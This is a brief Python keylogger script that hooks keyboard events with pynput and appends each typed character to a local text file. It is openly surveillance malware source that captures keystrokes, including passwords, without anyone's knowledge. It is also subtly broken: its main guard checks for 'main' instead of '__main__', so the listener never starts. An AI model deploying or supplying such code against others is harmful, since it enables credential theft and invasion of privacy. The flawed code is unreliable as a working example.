from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("kefile.txt",'a') as logkey:
        try: 
            char = key.char
            logkey.write(char)
        except: 
            print("Cannot get char")


if __name__ == "main":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()